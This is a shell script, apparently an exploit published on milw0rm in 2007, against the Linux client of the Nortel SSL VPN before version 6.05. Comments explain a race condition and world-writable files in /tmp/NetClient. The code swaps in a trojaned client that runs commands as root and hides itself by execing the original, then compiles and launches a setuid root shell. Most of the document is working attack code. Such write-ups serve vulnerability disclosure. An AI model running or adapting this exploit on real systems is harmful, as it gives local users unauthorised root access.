#!/bin/sh
# 
# Nortel SSL VPN Linux Client race condition
# 
# Jon Hart <jhart@spoofed.org>
#
# The Linux client that is utilized by versions priot to  6.05 of the Nortel
# SSL VPN appliance suffers from a number of problems that, in combination,
# allow an unprivileged local user to obtain root privileges.
# 
# This particular bug is as follows:
# 1) SSL VPN is initiated from the startNetdirect() javascript call
# 2) A zip archive is downloaded to the local machine which contains three
#    binaries necessary for the client: askpass, client, and surun.  This
#    archive is written to /tmp, chmod'd 777, and then it is extracted into
#    /tmp/NetClient
# 3) All of these files are chmod'd world writable by the following java
#    snippet, which is called on all UNIX client OSs:
#
#   protected boolean setPermissions(String file)
#   {
#      String command = "chmod a+xw " + file;
#      try
#      {
#         Process p = Runtime.getRuntime().exec(command);
#         p.waitFor();
#      }
#      ...
#   }
#
# 4) /tmp/NetClient/surun is executed, which in turn runs
#    /tmp/NetClient/askpass.  This process aquires the root password, and
#    then executes /tmp/NetClient/client via /bin/su and the root password.  
#
# There is clearly a bug in step 2 and 3 whereby files are installed world
# writable.  The bug I chose to exploit is the race condition in step 4,
# combined with the insecure permissions of steps 2 and 3, which (IMO),
# gives root more easily.  The risk here is if you have untrusted accounts
# on the machine from which you access the Nortel VPN, those accounts can
# easily gain local root access.
#
# The exploit is fairly simple.  Wait for /tmp/NetClient/client to appear,
# swap it for our "special version", and wait for a shell.
#
# Notes: a /tmp with nosuid will help mitigate this particular _exploit_,
# but not the vulnerability.  The same vulnerability also exists in the Mac
# client.  
#
# For education and testing purposes only.  Only run this on systems that
# you maintain/control.
#

cleanup() {
   rm -f $TMP_DIR/.*-$$\..*
}


run_cmd() {
   CMD=$@    
   VPN_CLIENT_RUN=`mktemp -t vpn_client_run-$$.XXXXXXXX`

   echo "Waiting for writable client"
   while (true); do
      if [ -w $CLIENT ]; then
         OLD_CLIENT=`mktemp -t old_client-$$.XXXXXXXXXX`
         echo "Saving old client"
         cp $CLIENT $OLD_CLIENT 
         chmod 755 $OLD_CLIENT
         echo "Writing new \"client\""
         echo "#!/bin/sh" > $CLIENT 
         echo "$CMD" >> $CLIENT
         echo "rm -f $VPN_CLIENT_RUN" >> $CLIENT
         # ensure the original client gets run so as to 
         # not alert the user
         echo "exec $OLD_CLIENT \$@" >> $CLIENT
         break
      fi
   done

   SUCCESS=0
   echo "Waiting for new client to be run"
   while (true); do
      if [ ! -f $VPN_CLIENT_RUN ]; then
         SUCCESS=1
         break
      else
         sleep 2
      fi
   done

   if [ $SUCCESS == 1 ]; then
      echo "Success"
      return 0
   else 
      echo "Exploit failed!"
      cleanup
      exit 1
   fi
}

suid_shell() {
   SH_C="sh_c-$$.c"

   # write out setuid shell
   cat >> $SH_C << EOF
   #include <sys/types.h>
   #include <unistd.h>
   int main (int argc, char **argv) {
      setuid(0);
      setgid(0);
      execl("/bin/bash", "bash", NULL);
   }
EOF

   # try like hell to get this shell compiled
   SH=`mktemp -t vpnshell-$$.XXXXXXXXXX`
   gcc -o $SH $SH_C 2>&1 > /dev/null 2>&1
   if [ $? != 0 ]; then
      cc -o $SH $SH_C 2>&1 > /dev/null 2>&1
      if [ $? != 0 ]; then
         echo "Compilation of shell failed"
         echo "Trying backup method..."
         run_cmd "cp /bin/sh $SH && chmod 4755 $SH"
         while (true); do
            if [ -u $SH ]; then
               $SH 
               cleanup
               exit
            else
               sleep 1
            fi
         done
         echo "Failed"
         cleanup
         exit 1
      fi
   fi
   rm -f $SH_C 

   run_cmd "chown root:root $SH && chmod 4755 $SH"

   # wait for our shell to be chmod'd
   SUCCESS=0
   echo "Waiting for suid shell"
   for sleep in `seq 1 60`; do
      if [ -u $SH ]; then
         echo "Success! setuid shell is $SH"
         SUCCESS=1
         break
      else
         sleep 2
      fi
   done

   if [ $SUCCESS == 1 ]; then
      cleanup
      $SH
   else 
      rm -f $SH
      echo "Exploit failed!"
      cleanup
      exit 1
   fi
}

CLIENT="/tmp/NetClient/client"

if [ -f $CLIENT ]; then
   echo "client $CLIENT already exists -- forcing stop"
   $CLIENT --stop
   for sleep in `seq 1 60`; do
      if [ ! -f $CLIENT ]; then
         break
      fi
      sleep 1
   done
fi

# hack to figure out where temp files get put...
TMP_FILE=`mktemp -t $$`
TMP_DIR=`dirname $TMP_FILE`
rm -f $TMP_FILE

trap cleanup 1 2 3 15

# two modes of operation -- get a root shell, or run a cmd as root.
if [ -z "$1" ]; then
   suid_shell
else 
   run_cmd $1 
fi

cleanup

# milw0rm.com [2007-02-21]
